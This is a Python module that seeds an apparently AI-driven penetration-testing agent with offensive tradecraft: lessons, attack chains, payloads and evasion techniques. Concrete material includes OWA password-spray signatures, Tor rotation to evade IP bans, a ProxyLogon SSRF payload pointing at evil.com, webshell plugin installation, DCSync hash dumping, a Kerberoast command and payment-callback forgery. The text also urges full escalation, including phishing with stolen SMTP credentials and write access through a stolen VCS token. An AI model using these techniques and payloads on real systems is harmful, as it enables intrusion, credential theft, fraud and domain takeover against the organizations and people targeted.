"""Built-in engagement knowledge — anonymized TTPs from real-world assessments.

Seeded automatically into ForgeBrain.memory at startup so every AI reasoning
call benefits from prior-engagement context without requiring re-import.

All client-identifying information has been removed. Techniques and patterns only.
"""
from __future__ import annotations

from typing import Any

# ──────────────────────────────────────────────────────────────────────────────
# LESSONS LEARNED
# Seeded as event_type="lesson" into ForgeBrain.memory
# ──────────────────────────────────────────────────────────────────────────────

LESSONS: list[dict[str, Any]] = [
    # ── Web recon ─────────────────────────────────────────────────────────────
    {
        "category": "recon",
        "framework": "webforge",
        "insight": (
            "A single /.git/config returning HTTP 200 is sufficient to confirm a full "
            "source dump is possible. Escalate immediately to automated object traversal "
            "— the entire source tree including secrets follows from that one response. "
            "Do not stop at confirming exposure; walk commit → tree → blob to extract all content."
        ),
    },
    {
        "category": "recon",
        "framework": "webforge",
        "insight": (
            "Git committer hostnames in .git/logs/HEAD expose cloud provider, region, and "
            "internal IP ranges when deployments are done manually on production servers. "
            "Parse the email field of each reflog entry — entries like "
            "'root@ip-172-31-43-73.ap-southeast-1.compute.internal' disclose AWS region, "
            "internal VPC subnet, and that deployments ran as root. This is passive "
            "infrastructure enumeration requiring only an HTTP GET."
        ),
    },
    {
        "category": "recon",
        "framework": "webforge",
        "insight": (
            "JavaScript bundles (React/Next.js, Flutter main.dart.js, Angular main.js) "
            "are goldmines. Always download and grep the full compiled bundle — not just "
            "visible page source. Flutter's main.dart.js can be 20-30 MB and often contains "
            "the entire app config including HMAC signing keys, API base URLs, basic auth "
            "credentials, and internal service endpoints hardcoded as Dart constants."
        ),
    },
    {
        "category": "recon",
        "framework": "webforge",
        "insight": (
            "Supabase anon keys embedded in JS bundles bypass all frontend authentication. "
            "The real gate is Row-Level Security (RLS) in Postgres. If RLS is disabled, "
            "the anon key provides full table read access. Always test: "
            "GET https://<project>.supabase.co/rest/v1/<table>?select=* "
            "with headers: apikey=<anon_key>, Authorization=Bearer <anon_key>. "
            "Enumerate tables via GET /rest/v1/ with no table name."
        ),
    },
    # ── Web techniques ────────────────────────────────────────────────────────
    {
        "category": "technique",
        "framework": "webforge",
        "insight": (
            "Commented-out validation code is a high-value finding in source review: "
            "the developer knew the check was needed but disabled it. This pattern is "
            "more likely to indicate an exploitable condition than missing validation "
            "that was never written. Look for commented blocks around origin/referer "
            "checks, HMAC verification, and rate-limiting logic."
        ),
    },
    {
        "category": "technique",
        "framework": "webforge",
        "insight": (
            "allow_url_fopen=On in PHP (detectable from external URL fetches in source "
            "or observable behavior) is a mandatory note for latent SSRF. Even if no "
            "direct SSRF exists today, any future input path that feeds imagecreatefrompng(), "
            "file_get_contents(), or similar file functions becomes an SSRF vector. "
            "Internal targets of interest: 169.254.169.254 (AWS IMDS), any discovered "
            "internal IPs from git log hostnames."
        ),
    },
    {
        "category": "technique",
        "framework": "webforge",
        "insight": (
            "For payment callback endpoints, the first check should always be: can this "
            "endpoint be called from an arbitrary origin with an attacker-controlled body? "
            "If yes and the server reflects the result value unconditionally into the client "
            "(WebView JS, redirect, JSON response), financial fraud is possible regardless "
            "of upstream bank controls. POST a forged 'SUCCESS' result from Origin: "
            "https://attacker.example.com and check if the server accepts it."
        ),
    },
    {
        "category": "technique",
        "framework": "adforge",
        "insight": (
            "EWS ResolveNames with SearchScope=ActiveDirectory is a full AD user directory "
            "dump that requires only a low-privilege domain account and port 443 to Exchange. "
            "No LDAP (389) or Kerberos (88) needed. Works even when traditional AD ports "
            "are firewalled. Iterate UnresolvedEntry prefix A-Z plus any romanized local-"
            "language name prefixes relevant to the target org's geography."
        ),
    },
    {
        "category": "technique",
        "framework": "adforge",
        "insight": (
            "OWA authentication response differentiation for password spray: "
            "success = HTTP 302 redirect to /owa/ inbox; "
            "failure = HTTP 302 redirect to /owa/auth/logon.aspx?reason=2. "
            "Use this pattern for reliable spray detection without triggering captchas "
            "or additional lockout signals. Rate: 1 attempt per account per 30-60 minutes."
        ),
    },
    {
        "category": "technique",
        "framework": "adforge",
        "insight": (
            "Employee enumeration chain without OSINT: "
            "app DB (Supabase/Firebase API) → extract employee emails → derive domain "
            "username (firstname.lastname@ → firstnamel@domain) → test Exchange OWA "
            "→ on success, pivot to EWS GAL for full org chart. Each step feeds the "
            "next without needing external intelligence sources."
        ),
    },
    # ── Evasion ───────────────────────────────────────────────────────────────
    {
        "category": "evasion",
        "framework": "webforge",
        "insight": (
            "403 on dotfiles and backup extensions does NOT confirm file existence when "
            "Apache has FilesMatch rules. The rule denies by extension unconditionally, "
            "regardless of whether the file exists. Always calibrate by testing a "
            "known-nonexistent path with the same extension — if it also returns 403, "
            "the rule is extension-based, not existence-based."
        ),
    },
    {
        "category": "evasion",
        "framework": "webforge",
        "insight": (
            "Tor via proxychains4 reliably bypasses IP-based bans (Fail2ban, "
            "Apache mod_evasive, basic IP blocklists). Use -q flag to suppress Tor "
            "noise. Rate-limit to 1 request per 1.5 seconds to avoid circuit-level "
            "detection. Does not bypass WAF signature rules — only per-IP blocks."
        ),
    },
    # ── Methodology ───────────────────────────────────────────────────────────
    {
        "category": "methodology",
        "framework": "webforge",
        "insight": (
            "IS4/OAuth middleware intercept creates false positives during client_id "
            "enumeration: if ALL client_ids return 302 — including fabricated nonsense "
            "values — the /connect/authorize endpoint is intercepted by blanket security "
            "middleware, not the real IS4 handler. Always test with a definitively "
            "invalid client_id first to calibrate before drawing conclusions."
        ),
    },
    {
        "category": "methodology",
        "framework": "adforge",
        "insight": (
            "Password patterns in organizations follow department/brand conventions. "
            "Extract these patterns early from any exposed config, onboarding docs, "
            "error messages, or default credential hints in JS bundles. "
            "Organization-name + year (OrgName@YYYY) and department + date (Dept@DDMM) "
            "patterns multiply spray success rates significantly in environments with "
            "weak password policies."
        ),
    },
    # ── Opsec ────────────────────────────────────────────────────────────────
    {
        "category": "opsec",
        "framework": "webforge",
        "insight": (
            "Verbose PHP error messages (display_errors=On) in production turn file path "
            "probes into a reliable file oracle. Combined with path traversal in parameters "
            "fed to imagecreatefrompng() or similar, PHP errors disclose the web root, "
            "exact source file path, and line number — without needing any successful file read."
        ),
    },
    {
        "category": "opsec",
        "framework": "webforge",
        "insight": (
            "Brute force via Hydra or similar tools against web servers triggers IP bans "
            "fast (~400-500 req/min = ban within minutes). Always start with slow manual "
            "credential testing to confirm lockout threshold first, then switch to automated "
            "tools only after confirming no lockout exists at low request rates."
        ),
    },
]


# ──────────────────────────────────────────────────────────────────────────────
# ATTACK CHAINS
# Seeded as event_type="attack_chain" into ForgeBrain.memory
# ──────────────────────────────────────────────────────────────────────────────

ATTACK_CHAINS: list[dict[str, Any]] = [
    {
        "chain_id": "git-exposure-to-supply-chain",
        "framework": "webforge",
        "rationale": (
            "A single misconfiguration (no deny rule on /.git/) cascades into full source "
            "disclosure, credential extraction, email impersonation capability, and potential "
            "supply chain compromise via internal VCS tokens. No authentication required at any step."
        ),
        "steps": [
            {
                "phase": "RECON",
                "action": "HTTP GET /.git/config — confirm public access and extract embedded VCS credentials from remote origin URL",
                "mitre": "TA0043/T1592",
            },
            {
                "phase": "RECON",
                "action": "Traverse git object graph: HEAD commit → tree → blobs. Reconstruct full source code including sendmail/mailer scripts, Dockerfile, docker-compose.",
                "mitre": "TA0009/T1213",
            },
            {
                "phase": "COLLECTION",
                "action": "Parse .git/logs/HEAD committer hostnames to identify cloud provider, region, and internal IP ranges used for production deployments.",
                "mitre": "TA0043/T1592",
            },
            {
                "phase": "COLLECTION",
                "action": "Extract hardcoded credentials from source blobs: SMTP passwords, API keys, reCAPTCHA secrets, database passwords.",
                "mitre": "TA0006/T1552.001",
            },
            {
                "phase": "LATERAL",
                "action": "Use extracted SMTP credentials to send email from official domain → high-trust phishing vector.",
                "mitre": "TA0040/T1566.002",
            },
            {
                "phase": "PERSISTENCE",
                "action": "Use extracted internal VCS PAT token to authenticate to internal Git server → read/write access to production source code.",
                "mitre": "TA0003/T1505.003",
            },
        ],
        "impact": "Full source disclosure → credential theft → email impersonation + potential write access to production codebase via VCS token.",
    },
    {
        "chain_id": "payment-callback-forgery",
        "framework": "webforge",
        "rationale": (
            "Payment callback endpoints that trust the POST body result value without "
            "cryptographic verification or server-side payment gateway confirmation "
            "are vulnerable to financial fraud from any network-adjacent attacker. "
            "Detection occurs only at batch reconciliation, hours to days later."
        ),
        "steps": [
            {
                "phase": "INITIAL_ACCESS",
                "action": "Victim initiates a payment through a mobile app using a WebView-based 3DS flow.",
                "mitre": "TA0001/T1190",
            },
            {
                "phase": "COLLECTION",
                "action": "Intercept the 3DS POST callback (via MitM proxy, compromised device, or ARP spoofing). Observe result=FAILURE in POST body.",
                "mitre": "TA0009/T1557",
            },
            {
                "phase": "EXECUTION",
                "action": "Modify intercepted request: change result=FAILURE to result=SUCCESS. Forward to server.",
                "mitre": "TA0040/T1565.002",
            },
            {
                "phase": "EXFIL",
                "action": "Server reflects SUCCESS into WebView JS → app notifies seller that payment succeeded → goods/funds released. No actual funds transferred.",
                "mitre": "TA0040/T1657",
            },
        ],
        "impact": "Financial fraud — attacker obtains goods or digital assets without funds leaving their account. Scalable with no per-transaction authentication barrier.",
    },
    {
        "chain_id": "js-bundle-to-domain-compromise",
        "framework": "webforge",
        "rationale": (
            "Each step in this chain feeds the next without requiring OSINT or network "
            "scanning. All discovery is via internet-facing services using information "
            "embedded in client-side code."
        ),
        "steps": [
            {
                "phase": "RECON",
                "action": "Download and analyze production JS bundle (React/Flutter/Angular). Extract Supabase/Firebase project URL and anon/service key.",
                "mitre": "TA0006/T1552.001",
            },
            {
                "phase": "INITIAL_ACCESS",
                "action": "Use extracted anon key to query backend database REST API directly. Enumerate all tables. Extract employee records including emails and roles.",
                "mitre": "TA0001/T1078",
            },
            {
                "phase": "COLLECTION",
                "action": "Find hardcoded default password in JS bundle (alert(), console.log(), or string literal). Authenticate to application as admin.",
                "mitre": "TA0006/T1552.001",
            },
            {
                "phase": "LATERAL",
                "action": "Derive domain usernames from extracted employee emails. Password spray Exchange OWA. Monitor for 302-to-inbox (success) vs 302-to-logon?reason=2 (failure).",
                "mitre": "TA0008/T1078.002",
            },
            {
                "phase": "COLLECTION",
                "action": "Authenticated to Exchange via EWS. Use ResolveNames SearchScope=ActiveDirectory to dump full domain user directory with job titles and departments.",
                "mitre": "TA0007/T1087.002",
            },
            {
                "phase": "COLLECTION",
                "action": "Discover billing/internal API endpoints from Flutter bundle app config. Test API endpoints without authentication. Extract customer PII at scale.",
                "mitre": "TA0009/T1213",
            },
        ],
        "impact": "Full employee database, corporate email access, complete domain user directory, customer PII — all via internet-facing services with no perimeter bypass.",
    },
    {
        "chain_id": "exchange-gal-to-domain-admin",
        "framework": "adforge",
        "rationale": (
            "EWS is often the only externally reachable domain service. GAL enumeration "
            "provides validated usernames. Exchange admin → WriteDACL on domain object → "
            "DCSync is a well-documented and reliable privilege escalation path."
        ),
        "steps": [
            {
                "phase": "RECON",
                "action": "EWS ResolveNames with SearchScope=ActiveDirectory yields full domain user list with job titles. Identify IT admin and privileged accounts.",
                "mitre": "TA0007/T1087.002",
            },
            {
                "phase": "LATERAL",
                "action": "Slow password spray against OWA (1 attempt/account/hour) using organization-pattern passwords. Success = 302 to inbox.",
                "mitre": "TA0008/T1110.003",
            },
            {
                "phase": "PRIV_ESC",
                "action": "Exchange admin account → WriteDACL on domain object → grant DCSync rights.",
                "mitre": "TA0004/T1484.001",
            },
            {
                "phase": "COLLECTION",
                "action": "impacket-secretsdump with DA/DCSync rights → dump all NTLM hashes → full domain compromise.",
                "mitre": "TA0006/T1003.006",
            },
        ],
        "impact": "Full Active Directory compromise. Access to all domain-joined systems including internal servers and management hosts.",
    },
    {
        "chain_id": "cms-admin-to-internal-foothold",
        "framework": "webforge",
        "rationale": (
            "CMS admin panels with only HTTP Basic auth are vulnerable to slow brute force "
            "via Tor (bypasses IP bans). Once in, plugin/extension upload provides PHP code "
            "execution on the web server, which is typically co-located with internal services."
        ),
        "steps": [
            {
                "phase": "INITIAL_ACCESS",
                "action": "Identify CMS admin panel (/panel/, /administrator/, /wp-admin/) on internet-facing host. Confirm HTTP Basic auth (401 + WWW-Authenticate).",
                "mitre": "TA0001/T1110.001",
            },
            {
                "phase": "INITIAL_ACCESS",
                "action": "Slow credential brute force via proxychains4+Tor to bypass IP bans. Use organization-pattern passwords. Rate: 1 req/1.5s.",
                "mitre": "TA0001/T1110.001",
            },
            {
                "phase": "EXECUTION",
                "action": "Install malicious extension/plugin (PHP webshell packaged as .zip). Execute OS commands on web server.",
                "mitre": "TA0002/T1505.003",
            },
            {
                "phase": "RECON",
                "action": "From webshell on internal network segment: run impacket, BloodHound, SMB enumeration. Kerberoast service accounts.",
                "mitre": "TA0007/T1087.002",
            },
        ],
        "impact": "Internal network foothold on a host co-located with domain services. Kerberoasting, lateral movement to domain controller.",
    },
]


# ──────────────────────────────────────────────────────────────────────────────
# FALSE NEGATIVES / NEXT-PHASE PROBES
# Seeded as event_type="fn_hint" into ForgeBrain.memory
# ──────────────────────────────────────────────────────────────────────────────

FALSE_NEGATIVES: list[dict[str, Any]] = [
    {
        "likely_vuln": "SSRF via PHP image/QR functions with allow_url_fopen=On",
        "reason": (
            "allow_url_fopen=On confirmed on server (script fetches external URLs via "
            "imagecreatefrompng or similar). If input validation on file/image parameters "
            "is ever loosened or if URL scheme prefixes (http://, file://) are accepted, "
            "the server will fetch attacker-controlled URLs. Internal targets: "
            "169.254.169.254 (AWS IMDS), any internal IPs discovered from git log hostnames."
        ),
        "suggested_module": "webforge/ssrf_probe",
        "suggested_payload": "param=http://169.254.169.254/latest/meta-data/",
        "priority": 1,
        "mitre": "TA0009/T1090",
    },
    {
        "likely_vuln": "SPA admin panel unauthenticated access via internal network pivot",
        "reason": (
            "Admin SPA loads with no frontend authentication challenge. API routes return "
            "403 from CDN/proxy — but the 403 is network-level (CloudFront/nginx), not "
            "application-level. Routes may be accessible from a pivot point inside the "
            "internal network (VPC, VPN, SSRF chain)."
        ),
        "suggested_module": "webforge/auth_bypass_probe",
        "suggested_payload": "GET /admin/api/users with X-Forwarded-For: <internal_ip>",
        "priority": 2,
        "mitre": "TA0001/T1190",
    },
    {
        "likely_vuln": "Kerberoasting via internal pivot",
        "reason": (
            "Valid domain credential obtained but Kerberos port 88 is firewalled externally. "
            "From an internal foothold (webshell, RCE) Kerberoasting is fully viable against "
            "service accounts with SPNs."
        ),
        "suggested_module": "kerberoast",
        "suggested_payload": "impacket-GetUserSPNs 'domain/<user>:<pass>' -dc-ip <DC_IP> -request",
        "priority": 1,
        "mitre": "TA0006/T1558.003",
    },
    {
        "likely_vuln": "ProxyLogon/ProxyShell on Exchange 2016 CU23 or earlier",
        "reason": (
            "Exchange 2016 CU23 is end of support and was vulnerable to ProxyLogon "
            "(CVE-2021-26855) and ProxyShell (CVE-2021-34473/34523/31207). "
            "If /ecp/ is accessible from internet without authentication, test the "
            "SSRF chain via X-BEResource header."
        ),
        "suggested_module": "cve_scanner",
        "suggested_payload": "POST /ecp/Y.js with X-BEResource: autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
        "priority": 2,
        "mitre": "TA0001/T1190",
    },
    {
        "likely_vuln": "Partial git repository dump despite 403 on index",
        "reason": (
            "/.git/HEAD returning 403 (not 404) with a different response size than a "
            "non-existent path confirms the .git directory exists on the server. "
            "Apache FilesMatch rules may block the index but not all object paths. "
            "git-dumper via Tor can sometimes reconstruct a partial repository."
        ),
        "suggested_module": "git_dumper",
        "suggested_payload": "git-dumper https://target/.git /tmp/dump/ --proxy socks5://127.0.0.1:9050",
        "priority": 3,
        "mitre": "TA0009/T1213",
    },
    {
        "likely_vuln": "Shared/department mailbox credential exposure via EWS",
        "reason": (
            "Shared mailboxes (IT-Support@, ICT@, helpdesk@) are typically readable by "
            "all domain users. May contain VPN configurations, server credentials, password "
            "reset emails, and provisioning scripts."
        ),
        "suggested_module": "ews_mailbox_enum",
        "suggested_payload": "EWS GetFolder with DistinguishedFolderId for shared mailbox",
        "priority": 2,
        "mitre": "TA0009/T1114.002",
    },
    {
        "likely_vuln": "HMAC-signed API authentication bypass via exposed signing key",
        "reason": (
            "HMAC-MD5 or HMAC-SHA256 signing key found in compiled JS bundle (Flutter/React). "
            "With the key and known signing formula, valid signatures can be forged for any "
            "phone number or user ID, bypassing API authentication entirely."
        ),
        "suggested_module": "auth_bypass",
        "suggested_payload": "import hashlib; sig = hashlib.md5(f'{app_id}{transdate}{salt}{identifier}'.encode()).hexdigest()",
        "priority": 1,
        "mitre": "TA0006/T1552",
    },
    {
        "likely_vuln": "Internal API reachable via Exchange SSRF (ProxyLogon chain)",
        "reason": (
            "Internal API discovered from app config on same subnet as Exchange server. "
            "Exchange SSRF (ProxyLogon) or EWS SubscribeToPushNotifications with an "
            "internal callback URL may reach services blocked from the internet."
        ),
        "suggested_module": "ssrf_scanner",
        "suggested_payload": "EWS SubscribeToPushNotifications with internal callback URL",
        "priority": 3,
        "mitre": "TA0007/T1090",
    },
]


# ──────────────────────────────────────────────────────────────────────────────
# EVASION TECHNIQUES
# Seeded as event_type="evasion" into ForgeBrain.memory
# ──────────────────────────────────────────────────────────────────────────────

EVASION_TECHNIQUES: list[dict[str, Any]] = [
    {
        "waf_name": "IP Ban (Fail2ban / Apache mod_evasive)",
        "technique": "Tor circuit rotation via proxychains4",
        "bypass_payload": "proxychains4 -q curl -sk --max-time 15 <url>",
        "confidence": "HIGH",
        "notes": (
            "Tor provides rotating exit IPs. Each circuit change gives a new IP, bypassing "
            "per-IP bans from Fail2ban or mod_evasive. Add -q to suppress Tor noise. "
            "Rate-limit to 1 req/1.5s. Does not bypass WAF signature rules."
        ),
    },
    {
        "waf_name": "ModSecurity",
        "technique": "URL encoding of first character in blocked parameter name",
        "bypass_payload": "?%63ommand=<value>  (URL-encode 'c' in 'command')",
        "confidence": "LOW",
        "notes": (
            "URL-encoding the first character of a blocked parameter name can bypass "
            "ModSecurity rules that match on literal parameter names. Confirm bypass by "
            "comparing response to WAF block (412) vs normal response — target file may "
            "still be absent (404), which confirms WAF bypass but not vulnerability."
        ),
    },
    {
        "waf_name": "ModSecurity",
        "technique": "GET-to-POST method switch for parameter smuggling",
        "bypass_payload": "Switch GET ?param=value to POST body: param=value",
        "confidence": "LOW",
        "notes": (
            "Switching GET to POST can bypass WAF rules that only inspect GET query "
            "parameters. Effective when WAF rules are not method-agnostic."
        ),
    },
    {
        "waf_name": "Apache FilesMatch",
        "technique": "Extension-based deny calibration (detection, not bypass)",
        "bypass_payload": "N/A — test with known-nonexistent path of same extension to calibrate",
        "confidence": "HIGH",
        "notes": (
            "403 on dotfiles (.env, .git) and backup extensions (.zip, .bak) does NOT "
            "confirm file existence when Apache has FilesMatch rules. The rule fires "
            "unconditionally on extension match. Test a known-nonexistent path with the "
            "same extension: if it also 403s, existence cannot be inferred from 403 alone."
        ),
    },
    {
        "waf_name": "ModSecurity / Application Layer",
        "technique": "Header injection for auth bypass (confirmed ineffective)",
        "bypass_payload": "X-Original-URL, X-Forwarded-For, X-Rewrite-URL, X-Custom-IP-Authorization",
        "confidence": "LOW",
        "notes": (
            "Header-based auth bypass (X-Original-URL, X-Forwarded-For spoofing) returned "
            "401 on a hardened ModSecurity target. Not universally effective. "
            "Document as attempted but failed — do not assume this works without testing."
        ),
    },
]


# ──────────────────────────────────────────────────────────────────────────────
# ERROR SIGNATURES
# Seeded as event_type="error_sig" into ForgeBrain.memory
# ──────────────────────────────────────────────────────────────────────────────

ERROR_SIGNATURES: list[dict[str, Any]] = [
    {
        "snippet": "Warning: imagecreatefrompng(/var/www/",
        "technology": "PHP with display_errors=On",
        "injectable": True,
        "notes": (
            "Verbose PHP error from GD image functions with path traversal in the file "
            "parameter. Discloses full web root path, exact source file, and line number. "
            "Confirms PHP 5.x/7.x with display_errors=On in production."
        ),
    },
    {
        "snippet": "HTTP 412 Precondition Failed",
        "technology": "ModSecurity WAF",
        "injectable": False,
        "notes": (
            "412 is ModSecurity's default block response code. Triggers on PHP file paths, "
            "CKFinder connector queries, and backup file extensions. Distinct from 403 "
            "(which Apache FilesMatch uses). Use 412 as WAF detection signal."
        ),
    },
    {
        "snippet": "302 to /owa/auth/logon.aspx?reason=2",
        "technology": "Exchange OWA — failed authentication",
        "injectable": False,
        "notes": (
            "reason=2 in OWA redirect indicates authentication failure. "
            "Success = 302 to /owa/ inbox (no reason parameter). "
            "Key differentiator for automated password spray — no CAPTCHA or "
            "additional lockout signal triggered at low rates."
        ),
    },
    {
        "snippet": "Security api worked",
        "technology": "Blanket security middleware intercepting IS4/OAuth routes",
        "injectable": False,
        "notes": (
            "All routes including nonexistent paths and invalid client_ids return this "
            "string when a blanket security middleware intercepts before IS4. Makes "
            "client_id enumeration impossible via response differentiation."
        ),
    },
]
